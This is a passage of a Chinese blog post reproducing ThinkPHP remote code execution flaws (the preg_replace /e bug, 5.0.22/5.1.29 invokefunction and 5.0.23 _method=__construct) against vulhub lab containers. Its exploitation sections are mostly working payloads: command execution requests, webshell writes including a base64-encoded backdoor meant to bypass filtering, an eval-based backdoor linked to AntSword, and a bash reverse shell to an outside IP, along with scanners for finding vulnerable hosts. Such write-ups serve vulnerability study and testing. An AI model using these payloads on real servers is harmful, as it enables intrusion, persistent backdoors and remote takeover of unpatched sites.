+<p>可以看到，因为没有一个变量名为5.6.19所以报错了，但是代码却执行了，有点像报错注入的感觉</p>
+<p>回到ThinkPHP的代码中来，可控的位置为implode($depr,$paths),implode()是将数组转成字符串，而’$var[&#39;\1&#39;]&#x3D;”\2”;’是对一个数组做操作。</p>
+<p>来分析一下正则(\w+)/([^&#x2F;]+)，这个正则的意思是取路径的每两个参数。</p>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;a/b/c/d/e/f&#x27;</span>;<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/(\w+)\/([^\/\/])/ies&quot;</span>,<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br><br><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$var</span>);<br><br>运行结果：<br><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [a] =&gt; b<br>    [c] =&gt; d<br>    [e] =&gt; f<br>)<br></code></pre></td></tr></table></figure>
+
+<p>通过上面的代码，更加清晰的是取出每2个参数，然后第一个参数作为数组的键，第二个参数作为数组的值，那么在这个过程中，上述例子如果$b可控，同样会发生代码执行。</p>
+<p>代码：此时$b采用的是双引号闭合的，注意如果采用单引号则不会有代码执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;a/<span class="hljs-subst">&#123;$&#123;phpversion()&#125;</span>&#125;/c/d/e/f&quot;</span>;<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/(\w+)\/([^\/\/])/ies&quot;</span>,<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br><br><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$var</span>);<br>运行结果：<br>Notice:  Undefined variable: <span class="hljs-number">5.4</span>.<span class="hljs-number">6</span> in [...][...]on line <span class="hljs-number">5</span><br><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [c] =&gt; d<br>    [e] =&gt; f<br>)<br></code></pre></td></tr></table></figure>
+<p>需要说明的是，代码执行的位置，必须是数组<strong>值</strong>的位置而不是键的位置。<br>然后再回到ThinkPHP的代码中来</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[C(<span class="hljs-string">&#x27;VAR_MODULE&#x27;</span>)])) &#123;<span class="hljs-regexp">//</span> 还没有定义模块名称<br>    <span class="hljs-variable">$var</span>[C(<span class="hljs-string">&#x27;VAR_MODULE&#x27;</span>)]  =   array_shift(<span class="hljs-variable">$paths</span>);<br>&#125;<br><span class="hljs-variable">$var</span>[C(<span class="hljs-string">&#x27;VAR_ACTION&#x27;</span>)]  =   array_shift(<span class="hljs-variable">$paths</span>);<br><span class="hljs-regexp">//</span> 解析剩余的URL参数<br><br><span class="hljs-variable">$res</span> = preg_replace(<span class="hljs-string">&#x27;@(\w+)&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;\/]+)@e&#x27;</span>, <span class="hljs-string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br><span class="hljs-variable">$_GET</span>   =  array_merge(<span class="hljs-variable">$var</span>,<span class="hljs-variable">$_GET</span>);<br></code></pre></td></tr></table></figure>
+<p>数组$var在路径存在模块和动作时，会去除掉前两个值。而数组$var来自于explode($depr,trim($_SERVER[‘PATH_INFO’],’&#x2F;‘));也就是路径。<br>所以我们可以构造poc如下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/index.php?s=a/</span>b<span class="hljs-regexp">/c/</span><span class="hljs-variable">$&#123;phpinfo()&#125;</span><br><span class="hljs-regexp">/index.php?s=a/</span>b<span class="hljs-regexp">/c/</span><span class="hljs-variable">$&#123;phpinfo()&#125;</span><span class="hljs-regexp">/c/</span>d<span class="hljs-regexp">/e/</span>f<br><span class="hljs-regexp">/index.php?s=a/</span>b<span class="hljs-regexp">/c/</span>d<span class="hljs-regexp">/e/</span><span class="hljs-variable">$&#123;phpinfo()&#125;</span><br>......<br><br><span class="hljs-regexp">/index.php?s=a/</span>b<span class="hljs-regexp">/c/</span><span class="hljs-variable">$&#123;@print(eval($_POST[1]))&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>参考博客链接<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/223149.html">https://www.freebuf.com/column/223149.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/14656631.html">https://www.cnblogs.com/cute-puli/p/14656631.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Hezhoutheone/article/details/120367626">https://blog.csdn.net/Hezhoutheone/article/details/120367626</a></p>
+<h2 id="thinkphp5-5-0-22-x2F-5-1-29-远程代码执行漏洞"><a href="#thinkphp5-5-0-22-x2F-5-1-29-远程代码执行漏洞" class="headerlink" title="thinkphp5 5.0.22&#x2F;5.1.29 远程代码执行漏洞"></a>thinkphp5 5.0.22&#x2F;5.1.29 远程代码执行漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Thinkphp是在中国使用极为广泛的PHP开发框架。在其版本5中，由于框架错误的处理了控制器名称，因此如果网站未启用强制路由(默认设置)，则该框架可以执行任何方法，从而导致RCE漏洞。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> vulhub-master/thinkphp/<span class="hljs-number">5</span>-rce<br><br>docker-compose <span class="hljs-keyword">up</span> -d<br><br>docker <span class="hljs-keyword">ps</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/401BE30CF31F4da9B89FB32E6D49D35B.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Thinkphp v5.0.x 补丁地址:<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a></p>
+<p>关键代码：<br>&#x2F;var&#x2F;www&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;App.php</p>
+<p><img src="/images/FDF508F8A59943e2B203CF87EC109E0F.png" srcset="/img/loading.gif" lazyload></p>
+<p>修复</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 获取控制器名<br><span class="hljs-variable">$controller</span> = strip_tags(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>] ?: <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;default_controller&#x27;</span>]);<br><br><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/^[A-Za-z](\w)*$/&#x27;</span>, <span class="hljs-variable">$controller</span>)) &#123;<br>    throw new HttpException(<span class="hljs-number">404</span>, <span class="hljs-string">&#x27;controller not exists:&#x27;</span> . <span class="hljs-variable">$controller</span>);<br>&#125;<br><br><span class="hljs-variable">$controller</span> = <span class="hljs-variable">$convert</span> ? strtolower(<span class="hljs-variable">$controller</span>) : <span class="hljs-variable">$controller</span>;<br><br><span class="hljs-regexp">//</span> 获取操作名<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><h4 id="TideFinger"><a href="#TideFinger" class="headerlink" title="TideFinger"></a>TideFinger</h4><p>项目介绍：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ruZlZtEUC09xfy327kFG4g">https://mp.weixin.qq.com/s/ruZlZtEUC09xfy327kFG4g</a></p>
+<p>下载地址：关注”Tide安全团队”公众号，回复指纹，下载Golang版TideFinger</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/TideFinger_Linux -u http:/</span><span class="hljs-regexp">/192.168.201.128:8080/</span> -pd<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/5EEDB062A1F942ebBB64778A19E9BEA2.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="afrog"><a href="#afrog" class="headerlink" title="afrog"></a>afrog</h4><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/zan8in/afrog">https://github.com/zan8in/afrog</a><br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/zan8in/afrog/releases">https://github.com/zan8in/afrog/releases</a>下载linux amd64的</p>
+<p><img src="/images/5895F17F676548a28D30515273F6D4D5.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://download.xray.cool/xray/1.9.4">https://download.xray.cool/xray/1.9.4</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">xray_windows_amd64<span class="hljs-selector-class">.exe</span> webscan <span class="hljs-attr">--listen</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7777</span> <span class="hljs-attr">--html-output</span> ming.html<br></code></pre></td></tr></table></figure>
+<p>操作较为繁杂，直接看教程<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Javachichi/article/details/137765427">xray使用教程</a><br>打开生成的网页ming.html</p>
+<p><img src="/images/6929E780040B42d89CB1F55FF0E135B8.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="thinkphp-scan"><a href="#thinkphp-scan" class="headerlink" title="thinkphp_scan"></a>thinkphp_scan</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/anx0ing/thinkphp_scan">https://github.com/anx0ing/thinkphp_scan</a></p>
+<p><img src="/images/58355A0E04654a80A33F8DE32C9A3437.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="thinkphpRCE"><a href="#thinkphpRCE" class="headerlink" title="thinkphpRCE"></a>thinkphpRCE</h4><p>下载地址<a target="_blank" rel="noopener" href="https://github.com/sukabuliet/ThinkphpRCE">https://github.com/sukabuliet/ThinkphpRCE</a></p>
+<p><img src="/images/BD6927288D8C4fa985D5ABFC3229D7BB.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="蓝鲸"><a href="#蓝鲸" class="headerlink" title="蓝鲸"></a>蓝鲸</h4><p><img src="/images/6510C7B6CEFA46eAA950135EF7C04DB.png" srcset="/img/loading.gif" lazyload><br><img src="/images/3F247E4AB808408d8EF6DA7511B02769.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="漏洞验证利用"><a href="#漏洞验证利用" class="headerlink" title="漏洞验证利用"></a>漏洞验证利用</h3><p>phpinfo</p>
+<p>payload</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://192.168.201.128:8080/index.php/?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=phpinfo&amp;vars[1][]=-1<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/B49DDE1BF8F648828F9338EB29EFBCB9.png" srcset="/img/loading.gif" lazyload></p>
+<p>任意代码执行<br>payload</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://192.168.201.128:8080/index.php/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=whoami<br></code></pre></td></tr></table></figure>
+<p><img src="/images/2DAE9E902FC44d6294D7DF373783A4C2.png" srcset="/img/loading.gif" lazyload></p>
+<p>写入webshell<br>payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;?php phpinfo(); eval(@$_POST[&#x27;cmd&#x27;]); ?&gt;</span><br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.201.128:8080</span>/index.php/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="hljs-number">0</span>]=file_put_contents&amp;vars[<span class="hljs-number">1</span>][]=shell.php&amp;vars[<span class="hljs-number">1</span>][]=%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%<span class="hljs-number">20</span>phpinfo()%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>eval(%<span class="hljs-number">40</span>%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>B&#x27;cmd&#x27;%<span class="hljs-number">5</span>D)%<span class="hljs-number">3</span>B%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure>
+<p>蚁剑连接后门<br><img src="/images/9DE353380D2044f7B721BE70B2D6E.png" srcset="/img/loading.gif" lazyload></p>
+<p>反弹shell</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://192.168.201.128:8080/index.php/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=bash<span class="hljs-code">+-c+</span><span class="hljs-emphasis">&#x27;bash+-i+&gt;%26+/dev/tcp/192.168.1.5/5678+0&gt;%261&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/A729948C19DD4d29AF788548BB99D2D4.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="https://learnku.com/articles/21227">ThinkPHP 5.x 远程命令执行漏洞分析与复现</a></p>
+<h2 id="thinkphp5-5-0-23-远程代码执行漏洞"><a href="#thinkphp5-5-0-23-远程代码执行漏洞" class="headerlink" title="thinkphp5 5.0.23 远程代码执行漏洞"></a>thinkphp5 5.0.23 远程代码执行漏洞</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在其版本5.0(&lt;5.0.24)中，框架在获取请求方法时会错误的对其进行处理，就是在获取method的方法中没有正确处理方法名，这使攻击者可以调用Request类的任何方法，攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</p>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> vulhub-master/thinkphp/<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">23</span>-rce<br><br><span class="hljs-attribute">docker</span>-compose up -d<br><br><span class="hljs-attribute">docker</span> ps<br></code></pre></td></tr></table></figure>
+
+<h3 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><h4 id="TideFinger-1"><a href="#TideFinger-1" class="headerlink" title="TideFinger"></a>TideFinger</h4><p>项目介绍：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ruZlZtEUC09xfy327kFG4g">https://mp.weixin.qq.com/s/ruZlZtEUC09xfy327kFG4g</a><br>下载地址：关注“Tide安全团队”公众号，回复指纹即可</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">TideFinger.exe -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">201.128</span>:<span class="hljs-number">8080</span>/ -pd<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/64DFC5CB0522410dB92AEA3151B96CB0.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="afrog-1"><a href="#afrog-1" class="headerlink" title="afrog"></a>afrog</h4><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/zan8in/afrog">https://github.com/zan8in/afrog</a><br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/zan8in/afrog/releases">https://github.com/zan8in/afrog/releases</a></p>
+<p><img src="/images/2A3799100CDD4f70B159D5BA2C439C05.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="xray-1"><a href="#xray-1" class="headerlink" title="xray"></a>xray</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">xray_windows_amd64<span class="hljs-selector-class">.exe</span> webscan <span class="hljs-attr">--listen</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7777</span> <span class="hljs-attr">--html-output</span> ming1.html<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/242F5749F46949948B1436E1C912DDC4.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="thinkphp-scan-1"><a href="#thinkphp-scan-1" class="headerlink" title="thinkphp_scan"></a>thinkphp_scan</h4><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/anx0ing/thinkphp_scan">https://github.com/anx0ing/thinkphp_scan</a></p>
+<p><img src="/images/FB85CA4DF8F746d989D6E411DC056EC4.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="ThinkphpRCE"><a href="#ThinkphpRCE" class="headerlink" title="ThinkphpRCE"></a>ThinkphpRCE</h4><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/sukabuliet/ThinkphpRCE">https://github.com/sukabuliet/ThinkphpRCE</a></p>
+<p><img src="/images/FAA6DB989BB543769B289D2CB638FCCE.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="蓝鲸-1"><a href="#蓝鲸-1" class="headerlink" title="蓝鲸"></a>蓝鲸</h4><p><img src="/images/2FE400ED65694c8281332E98CCD5B59C.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/1B84B4231D6E4475B56C6DAD1BA21FAF.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="漏洞验证利用-1"><a href="#漏洞验证利用-1" class="headerlink" title="漏洞验证利用"></a>漏洞验证利用</h3><p>发送如下数据包，尝试执行命令</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php?s=captcha</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.201.128:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>80<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.201.128:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.201.128:8080/<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=1<br><br><span class="language-oxygene">_method=__construct&amp;filter%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=system&amp;<span class="hljs-keyword">method</span>=<span class="hljs-title function_">get</span>&amp;<span class="hljs-title function_">server</span>%5<span class="hljs-title function_">BREQUEST_METHOD</span>%5<span class="hljs-title function_">D</span>=<span class="hljs-title function_">id</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/34BD12D1BBC04c9d9DC18D673811ACF6.png" srcset="/img/loading.gif" lazyload></p>
+<p>传后门</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-keyword">eval</span>(@<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell3.php</span><br><span class="language-xml"></span><br><span class="language-xml">这里不能用 get 和 post  只能用 request</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">  失败</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 失败</span><br></code></pre></td></tr></table></figure>
+
+<p>成功连接到蚁剑</p>
+<p>整个新姿势，base64编码绕过过滤</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">_method=__construct&amp;filter[]=system&amp;<span class="hljs-keyword">method</span>=<span class="hljs-title function_">get</span>&amp;<span class="hljs-title function_">server</span>[<span class="hljs-title function_">REQUEST_METHOD</span>]=<span class="hljs-title function_">echo</span> -<span class="hljs-title function_">n</span> <span class="hljs-title function_">PD9waHAgcGhwaW5mbygpOyBldmFsKEAkX1JFUVVFU1RbJ2NtZCddKTsgPz4</span>= | <span class="hljs-title function_">base64</span> -<span class="hljs-title function_">d</span> &gt; <span class="hljs-title function_">shell1</span>.<span class="hljs-title function_">php</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/218B3B6BA8624c67A8CD7D7648D7FFBD.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>thinkphp漏洞复现</div>
+      <div>http://example.com/2024/05/15/thinkphp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>奇怪的奇怪</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/16/wugonglunjian/" title="武功论剑-武功山杯">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">武功论剑-武功山杯</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/15/yii/" title="yii漏洞复现">
+                        <span class="hidden-mobile">yii漏洞复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","appKey":"2jVxSBuNhzKC1JEOZN2aZTgr","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
